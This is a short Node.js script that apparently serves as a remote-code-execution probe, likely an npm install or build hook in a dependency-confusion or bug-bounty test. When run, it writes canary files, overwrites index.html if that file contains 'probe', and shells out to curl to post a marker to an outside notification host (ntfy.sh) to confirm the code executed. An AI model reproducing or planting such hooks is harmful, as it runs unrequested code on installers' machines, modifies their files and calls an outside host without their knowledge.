const fs = require('fs');
const TOPIC = 'rce2-figma-e9a00199af4f9d86';
function w(f, s) { try { fs.writeFileSync(f, s); } catch (e) {} }
w('P65GITHUB_NPM_RAN.txt', 'RCE2P65GITHUB\n');
w('canary_npm65.txt', 'RCE2P65GITHUB\n');
try { const s = fs.readFileSync('index.html', 'utf8'); if (s.indexOf('probe') !== -1) w('index.html', '<!doctype html><html><body>RCE2P65GITHUBBUILD</body></html>\n'); } catch (e) {}
try { require('child_process').execSync('curl -s -m 4 -d RCE2P65GITHUBNPM https://ntfy.sh/' + TOPIC + ' 2>/dev/null || true', {timeout: 8000}); } catch (e) {}
